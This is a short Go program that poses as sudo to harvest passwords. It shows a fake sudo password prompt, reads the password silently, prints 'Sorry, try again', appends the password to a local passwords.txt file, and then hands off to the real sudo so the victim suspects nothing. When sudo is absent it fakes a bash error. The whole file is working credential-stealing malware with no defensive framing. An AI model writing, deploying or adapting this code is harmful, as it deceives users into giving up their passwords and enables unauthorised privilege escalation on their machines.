package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"

	tty "github.com/mattn/go-tty"
)

func grabPassword() {
	tty, _ := tty.Open()
	defer tty.Close()
	out := tty.Output()
	defer out.Close()

	fmt.Fprintf(out, "[sudo] password for %s: ", os.Getenv("USER"))
	pass, _ := tty.ReadPasswordNoEcho()
	time.Sleep(2 * time.Second) // authentic backoff time
	fmt.Fprintln(out, "Sorry, try again.")

	f, _ := os.OpenFile("passwords.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0650)
	defer f.Close()
	fmt.Fprintln(f, pass)
}

func main() {
	sudoPath, err := exec.LookPath("sudo")
	if err != nil {
		// act like we are bash
		fmt.Fprintf(os.Stderr, "bash: sudo: command not found\n")
		os.Exit(127)
	}

	grabPassword()

	// Switch to real sudo
	args := append([]string{"sudo", "-k"}, os.Args[1:]...)
	syscall.Exec(sudoPath, args, os.Environ())
}
